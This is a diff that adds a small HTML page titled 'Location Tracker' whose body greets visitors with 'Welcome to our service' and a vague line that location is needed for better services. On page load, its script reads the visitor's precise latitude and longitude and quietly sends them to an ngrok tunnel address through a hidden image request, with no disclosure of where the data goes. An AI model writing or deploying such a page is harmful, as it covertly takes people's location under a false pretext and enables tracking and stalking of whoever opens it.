@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Location Tracker</title>
+    <script>
+        window.onload = function() {
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    var latitude = position.coords.latitude;
+                    var longitude = position.coords.longitude;
+                    var img = document.createElement('img');
+                    img.src = 'https://b33b-175-107-227-158.ngrok-free.app/collect?lat=' + latitude + '&lon=' + longitude;
+                    document.body.appendChild(img);
+                },
+                function(error) {
+                    console.error("Error getting location: " + error.message);
+                }
+            );
+        };
+    </script>
+</head>
+<body>
+    <h1>Welcome to our service</h1>
+    <p>We need to access your location to provide better services.</p>
+</body>
+</html>
